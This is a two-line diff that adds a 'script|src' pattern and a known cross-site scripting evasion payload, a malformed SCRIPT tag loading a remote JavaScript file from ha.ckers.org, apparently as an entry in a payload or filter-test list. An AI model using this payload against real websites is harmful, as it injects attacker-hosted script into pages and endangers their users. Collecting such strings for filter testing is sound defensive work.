@@ -1,0 +1,2 @@
+script|src
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
